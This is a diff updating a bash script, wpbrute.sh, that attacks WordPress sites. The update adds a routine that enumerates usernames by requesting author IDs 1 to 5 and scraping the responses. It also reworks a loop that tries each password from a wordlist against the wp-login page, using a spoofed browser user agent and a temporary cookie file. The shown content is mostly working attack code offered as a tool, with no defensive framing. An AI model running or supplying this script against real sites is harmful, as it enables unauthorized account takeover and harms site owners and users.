@@ -9,34 +9,66 @@
 # --------------------------------------------------------------------------------
 #
 
-# v.1.1
+# v.1.2
 
 USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
 TIMEOUT=1
 COOKIE=cookie-`date +%s`
 COOKIE_PATH="/tmp/$COOKIE"
 
+# Help
+help_man(){
+	echo -e "Arguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
+	echo -e "User Enumeration:\n./wpbrute.sh --url=www.example.com\n\nPassword Bruteforce:\n./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt"
+}
+
+
+# Test wordpress url
+test_url(){
+	CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
+	if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
+}
+
+# User Enumeration
+user_enum(){
+	echo "[+] Username or nickname enumeration"
+	for i in {1..5} 
+	do
+		curl -s -L -i $WP_URL/?author=$i | grep -E -o "\" title=\"View all posts by [a-sz0-9A-Z\-\.]*.*\" |Location:.*" | sed 's/\// /g' | cut -f6 -d ' ' | sed 's/\"//g' | grep -v "^$"
+	done
+	exit
+}
+
+# ===================== START =====================
+
 # Get arguments
 args_array=( $@ )
 len_args=${#args_array[@]}
 
-if [ "$len_args" -ne 3 ]; then
-	# Help
-	echo -e "Arguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
-	echo -e "Example:\n./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt"
+# Check arguments
+if [ "$len_args" -eq 1 ]; then
+	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
+	test_url
+	user_enum
+fi
+
+if [ "$len_args" -ne 3 ]; then 
+	help_man
 	exit
 else
-	# Check arguments
+	# Get value
 	WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
 	WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
 	if [ ! -f "$WP_PASSWORD" ]; then echo "Wordlist not found: $WP_PASSWORD"; exit; fi
 	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
-	CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
-	if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
+	test_url
 fi
 
-# Start
+# Get cookie
 curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login > /dev/null
+
+# Bruteforce
+echo "[+] Bruteforcing user [$WP_ADMIN]"
 cat "$WP_PASSWORD" | while read line;
 	do {
 		echo $line
@@ -46,4 +78,6 @@ cat "$WP_PASSWORD" | while read line;
 	}
 	done
 
+# Remove cookie
 rm "$COOKIE_PATH" 2> /dev/null
+
